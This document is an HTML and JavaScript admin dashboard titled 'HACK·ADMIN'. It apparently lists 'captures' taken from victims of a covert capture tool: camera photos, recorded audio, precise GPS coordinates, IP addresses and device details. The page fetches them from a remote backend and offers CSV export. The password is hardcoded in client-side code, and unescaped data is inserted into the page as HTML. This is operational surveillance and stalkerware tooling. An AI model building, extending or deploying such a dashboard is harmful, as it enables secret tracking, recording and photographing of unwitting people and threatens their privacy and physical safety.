<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>⬛ HACK·ADMIN</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: #0b0d0f;
            color: #b7f0b7;
            font-family: 'Share Tech Mono', 'Fira Code', 'Courier New', monospace;
            padding: 20px;
            min-height: 100vh;
            display: flex;
            justify-content: center;
        }
        .container {
            max-width: 1400px;
            width: 100%;
        }

        /* LOGIN — neon glitch */
        .login-box {
            background: #101418;
            border: 1px solid #2b5f3a;
            border-radius: 28px;
            padding: 44px 32px;
            max-width: 380px;
            margin: 80px auto;
            box-shadow: 0 0 30px rgba(0, 255, 100, 0.04), inset 0 0 30px rgba(0, 30, 0, 0.3);
            text-align: center;
            backdrop-filter: blur(2px);
        }
        .login-box h2 {
            font-weight: 400;
            letter-spacing: 4px;
            font-size: 26px;
            color: #7cf0a0;
            text-shadow: 0 0 8px #1f6d3a;
            margin-bottom: 28px;
        }
        .login-box input {
            width: 100%;
            padding: 14px 20px;
            margin: 14px 0;
            background: #0e151a;
            border: 1px solid #1f4a2e;
            border-radius: 60px;
            color: #b7f0b7;
            font-size: 16px;
            font-family: inherit;
            outline: none;
            letter-spacing: 1px;
            transition: 0.2s;
            box-shadow: inset 0 0 12px rgba(0, 30, 0, 0.4);
        }
        .login-box input:focus {
            border-color: #3ae07a;
            box-shadow: 0 0 20px rgba(40, 220, 100, 0.15), inset 0 0 12px #0a2a1a;
        }
        .login-box button {
            width: 100%;
            padding: 14px;
            background: #0f2a1a;
            border: 1px solid #2b8a4a;
            border-radius: 60px;
            color: #b7f0b7;
            font-weight: 400;
            font-size: 18px;
            letter-spacing: 3px;
            cursor: pointer;
            transition: 0.2s;
            margin-top: 10px;
            text-transform: uppercase;
            background: #0e1f16;
            box-shadow: 0 0 16px rgba(0, 200, 80, 0.05);
        }
        .login-box button:hover {
            background: #1a3a2a;
            border-color: #4ae08a;
            box-shadow: 0 0 30px rgba(40, 220, 100, 0.1);
            transform: scale(0.98);
        }
        .login-box .error {
            color: #ff6a7a;
            margin-top: 18px;
            font-size: 15px;
            min-height: 26px;
            text-shadow: 0 0 6px #5f1a2a;
        }

        /* GALLERY — hacker terminal */
        .gallery {
            display: none;
        }
        header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 16px;
            margin-bottom: 30px;
            border-bottom: 1px solid #1f3a2a;
            padding-bottom: 16px;
        }
        header h2 {
            font-weight: 400;
            font-size: 26px;
            color: #8cf0b0;
            letter-spacing: 2px;
            text-shadow: 0 0 6px #1f6d3a;
        }
        .stats {
            color: #6d9a7a;
            font-size: 15px;
            letter-spacing: 1px;
        }
        .stats span {
            color: #b7f0b7;
            font-weight: 400;
            font-size: 28px;
            margin-left: 8px;
            text-shadow: 0 0 10px #2a8a4a;
        }
        .header-buttons {
            display: flex;
            gap: 12px;
            flex-wrap: wrap;
        }
        .header-buttons button {
            padding: 8px 22px;
            background: transparent;
            border: 1px solid #2a5a3a;
            border-radius: 40px;
            color: #8cf0b0;
            font-family: inherit;
            font-weight: 400;
            font-size: 14px;
            letter-spacing: 1px;
            cursor: pointer;
            transition: 0.2s;
            background: #0d1818;
        }
        .header-buttons button:hover {
            background: #1a2f26;
            border-color: #4ae08a;
            box-shadow: 0 0 16px rgba(40, 220, 100, 0.05);
        }
        .header-buttons .logout {
            border-color: #4a2a2a;
            color: #f07a8a;
        }
        .header-buttons .logout:hover {
            background: #2a1a1a;
            border-color: #f06a7a;
        }

        /* GRID — cards */
        .grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(340px, 1fr));
            gap: 24px;
        }

        .card {
            background: #0d141a;
            border: 1px solid #1f3a2a;
            border-radius: 22px;
            overflow: hidden;
            transition: 0.25s ease;
            box-shadow: 0 8px 24px -10px #00000080;
        }
        .card:hover {
            border-color: #3a7a4a;
            box-shadow: 0 0 28px rgba(0, 200, 80, 0.04);
        }

        /* image + location + minimal */
        .img-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            min-height: 160px;
            background: #0a1116;
        }
        .img-grid img {
            width: 100%;
            height: 100%;
            min-height: 150px;
            object-fit: cover;
            cursor: pointer;
            background: #0a1014;
            border-right: 1px solid #1a2e26;
        }
        .img-grid .badge-loc {
            padding: 14px 12px;
            display: flex;
            flex-direction: column;
            justify-content: center;
            background: #0d151c;
            gap: 6px;
            font-size: 13px;
            line-height: 1.5;
            color: #8fbfa0;
        }
        .badge-loc .glitch {
            color: #7cf0a0;
            font-size: 11px;
            text-transform: uppercase;
            letter-spacing: 2px;
            margin-bottom: 6px;
            opacity: 0.7;
        }
        .badge-loc .row {
            display: flex;
            align-items: baseline;
            gap: 8px;
        }
        .badge-loc .row .tag {
            opacity: 0.5;
            width: 20px;
        }
        .badge-loc .row .val {
            color: #c8f0d0;
            font-weight: 400;
            word-break: break-word;
        }

        .info {
            padding: 14px 14px 12px;
            background: #0e171f;
        }

        /* minimal details: only location, ip, timestamp, battery, os (but we removed device block) */
        .detail-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 6px 16px;
            font-size: 12px;
            color: #8fbfa0;
            margin-bottom: 8px;
        }
        .detail-grid .item {
            display: flex;
            align-items: center;
            gap: 6px;
            border-bottom: 1px dotted #1a2e26;
            padding-bottom: 4px;
        }
        .detail-grid .item .emoji {
            opacity: 0.6;
            width: 18px;
        }
        .detail-grid .item .val {
            color: #d2f0da;
        }

        .timestamp {
            font-size: 11px;
            color: #3d6a4a;
            margin: 8px 0 10px;
            letter-spacing: 0.5px;
        }

        .audio-player {
            margin: 12px 0 10px;
            background: #0b141a;
            border-radius: 40px;
            padding: 2px 6px;
            border: 1px solid #1f3a2a;
        }
        .audio-player audio {
            width: 100%;
            height: 34px;
            border-radius: 40px;
            outline: none;
            background: #0a1116;
        }

        .card-actions {
            display: flex;
            gap: 12px;
            margin-top: 4px;
        }
        .delete-btn {
            padding: 6px 18px;
            background: #1f1a2a;
            border: 1px solid #3a2a3a;
            border-radius: 40px;
            color: #f07a8a;
            font-weight: 400;
            font-size: 12px;
            font-family: inherit;
            cursor: pointer;
            transition: 0.15s;
            letter-spacing: 0.5px;
        }
        .delete-btn:hover {
            background: #2a1a2a;
            border-color: #f06a7a;
            color: #ff8a9a;
        }

        .loading, .no-data {
            grid-column: 1 / -1;
            text-align: center;
            padding: 60px 20px;
            color: #4d7a5a;
            font-size: 18px;
            background: #0d151c;
            border-radius: 40px;
            border: 1px dashed #1f3a2a;
            letter-spacing: 1px;
        }

        /* lightbox */
        .lightbox {
            display: none;
            position: fixed;
            top: 0; left: 0; right: 0; bottom: 0;
            background: rgba(2, 8, 6, 0.96);
            backdrop-filter: blur(6px);
            justify-content: center;
            align-items: center;
            z-index: 9999;
            padding: 30px;
        }
        .lightbox img {
            max-width: 92%;
            max-height: 88%;
            border-radius: 18px;
            border: 1px solid #2a5a3a;
            box-shadow: 0 0 60px #0a1a0a;
            object-fit: contain;
        }
        .lightbox .close {
            position: absolute;
            top: 28px;
            right: 40px;
            color: #7cf0a0;
            font-size: 44px;
            cursor: pointer;
            opacity: 0.6;
            transition: 0.2s;
            line-height: 1;
        }
        .lightbox .close:hover {
            opacity: 1;
            transform: scale(1.08);
        }

        @media (max-width: 600px) {
            body { padding: 12px; }
            .login-box { margin: 40px auto; padding: 30px 20px; }
            .grid { grid-template-columns: 1fr; }
            .img-grid { grid-template-columns: 1fr 1fr; min-height: 140px; }
            .img-grid img { min-height: 120px; }
        }
    </style>
</head>
<body>
<div class="container">

    <!-- lightbox -->
    <div class="lightbox" id="lightbox" onclick="closeLightbox()">
        <span class="close" onclick="event.stopPropagation(); closeLightbox()">✕</span>
        <img id="lightboxImg" src="" alt="preview" />
    </div>

    <!-- login -->
    <div class="login-box" id="loginBox">
        <h2>⧩ ADMIN</h2>
        <input type="password" id="passwordInput" placeholder="password" autofocus />
        <button onclick="login()">UNLOCK</button>
        <div class="error" id="loginError"></div>
    </div>

    <!-- gallery -->
    <div class="gallery" id="gallery">
        <header>
            <div>
                <h2>⌨ CAPTURES</h2>
                <div class="stats">TOTAL <span id="total">0</span></div>
            </div>
            <div class="header-buttons">
                <button onclick="exportCSV()">⧩ CSV</button>
                <button onclick="loadData()">↻ REFRESH</button>
                <button class="logout" onclick="logout()">⍈ EXIT</button>
            </div>
        </header>
        <div class="grid" id="grid"></div>
    </div>
</div>

<script>
    (function() {
        const BACKEND_URL = 'https://auto-capture-pro.onrender.com';
        const PASSWORD = 'admin123#@!';

        const loginBox = document.getElementById('loginBox');
        const gallery = document.getElementById('gallery');
        const passwordInput = document.getElementById('passwordInput');
        const loginError = document.getElementById('loginError');
        const grid = document.getElementById('grid');
        const totalSpan = document.getElementById('total');
        const lightbox = document.getElementById('lightbox');
        const lightboxImg = document.getElementById('lightboxImg');

        function closeLightbox() {
            lightbox.style.display = 'none';
        }
        window.closeLightbox = closeLightbox;

        function openLightbox(src) {
            if (!src || src === '#') return;
            lightboxImg.src = src;
            lightbox.style.display = 'flex';
        }
        window.openLightbox = openLightbox;

        window.login = function() {
            const pwd = passwordInput.value.trim();
            if (pwd === PASSWORD) {
                loginBox.style.display = 'none';
                gallery.style.display = 'block';
                loginError.textContent = '';
                loadData();
            } else {
                loginError.textContent = '⛔ ACCESS DENIED';
                passwordInput.value = '';
                passwordInput.focus();
            }
        };

        window.logout = function() {
            loginBox.style.display = 'block';
            gallery.style.display = 'none';
            passwordInput.value = '';
            loginError.textContent = '';
            grid.innerHTML = '';
            totalSpan.textContent = '0';
        };

        window.exportCSV = function() {
            window.open(BACKEND_URL + '/api/export-csv', '_blank');
        };

        window.loadData = async function() {
            grid.innerHTML = '<div class="loading">⏳ loading captures…</div>';
            try {
                const res = await fetch(BACKEND_URL + '/api/admin/get-data', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ password: PASSWORD })
                });
                if (!res.ok) throw new Error('HTTP ' + res.status);
                const data = await res.json();
                if (!data.success) {
                    grid.innerHTML = `<div class="no-data">⛔ ${data.message || 'error'}</div>`;
                    return;
                }
                totalSpan.textContent = data.count || 0;
                const items = data.data || [];
                if (items.length === 0) {
                    grid.innerHTML = '<div class="no-data">📭 no captures</div>';
                    return;
                }

                grid.innerHTML = '';
                items.forEach(item => {
                    const device = item.fullDeviceInfo || item.deviceDetails || {};
                    const loc = item.location || {};
                    const card = document.createElement('div');
                    card.className = 'card';

                    const photoSrc = item.userPhoto || item.cameraImage || '#';

                    let audioHtml = '';
                    if (item.audioData && item.audioData !== 'null' && item.audioData.length > 20) {
                        audioHtml = `<div class="audio-player"><audio controls><source src="${item.audioData}" type="audio/webm"></audio></div>`;
                    }

                    // LEFT SIDE: only location & minimal (NO device model/manufacturer/os)
                    const badge = `
                        <div class="badge-loc">
                            <div class="glitch">⧩ geoloc</div>
                            <div class="row"><span class="tag">📍</span> <span class="val">${loc.lat?.toFixed(5) || '—'}</span></div>
                            <div class="row"><span class="tag">📍</span> <span class="val">${loc.lng?.toFixed(5) || '—'}</span></div>
                            <div class="row"><span class="tag">🎯</span> <span class="val">${loc.accuracy || '—'}m</span></div>
                            <div class="row"><span class="tag">📡</span> <span class="val">${item.ipAddress || '—'}</span></div>
                        </div>
                    `;

                    // DETAILS: remove device name/model/manufacturer/os — only battery, connection, screen, memory, cores, language, timezone
                    // we keep only 'battery', 'connection', 'screen', 'memory', 'cores', 'language', 'timezone'
                    const details = `
                        <div class="detail-grid">
                            <div class="item"><span class="emoji">🔋</span> <span class="val">${device.battery?.level || '—'}</span></div>
                            <div class="item"><span class="emoji">📶</span> <span class="val">${device.connection?.type || '—'}</span></div>
                            <div class="item"><span class="emoji">🖥️</span> <span class="val">${device.screen?.width || '—'}×${device.screen?.height || '—'}</span></div>
                            <div class="item"><span class="emoji">🧠</span> <span class="val">${device.memory || '—'}GB</span></div>
                            <div class="item"><span class="emoji">⚡</span> <span class="val">${device.cores || '—'}</span></div>
                            <div class="item"><span class="emoji">🌐</span> <span class="val">${device.language || '—'}</span></div>
                            <div class="item"><span class="emoji">🕒</span> <span class="val">${device.timezone || '—'}</span></div>
                        </div>
                    `;

                    const timestamp = item.timestamp ? new Date(item.timestamp).toLocaleString('en-IN', { hour12: true }) : '—';

                    card.innerHTML = `
                        <div class="img-grid">
                            <img src="${photoSrc}" onclick="openLightbox('${photoSrc}')" onerror="this.src='data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 width=%22100%22 height=%22100%22><rect fill=%22%23121f1a%22 width=%22100%22 height=%22100%22/><text x=%2250%22 y=%2258%22 text-anchor=%22middle%22 fill=%22%233a6a4a%22 font-size=%2232%22>📸</text></svg>'" />
                            ${badge}
                        </div>
                        <div class="info">
                            ${details}
                            <div class="timestamp">🕐 ${timestamp}</div>
                            ${audioHtml}
                            <div class="card-actions">
                                <button class="delete-btn" onclick="deleteData('${item._id}')">🗑 DELETE</button>
                            </div>
                        </div>
                    `;
                    grid.appendChild(card);
                });
            } catch (err) {
                console.error(err);
                grid.innerHTML = `<div class="no-data">❌ ${err.message || 'network error'}</div>`;
            }
        };

        window.deleteData = async function(id) {
            if (!id || !confirm('DELETE this capture?')) return;
            try {
                const res = await fetch(BACKEND_URL + '/api/admin/delete', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ password: PASSWORD, id })
                });
                const data = await res.json();
                if (data.success) {
                    loadData();
                } else {
                    alert('Error: ' + (data.message || 'unknown'));
                }
            } catch (err) {
                alert('Error: ' + err.message);
            }
        };

        passwordInput.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') window.login();
        });

        document.addEventListener('keydown', (e) => {
            if (e.key === 'Escape') closeLightbox();
        });

        console.log('⧩ HACK ADMIN · backend:', BACKEND_URL);
    })();
</script>
</body>
</html>
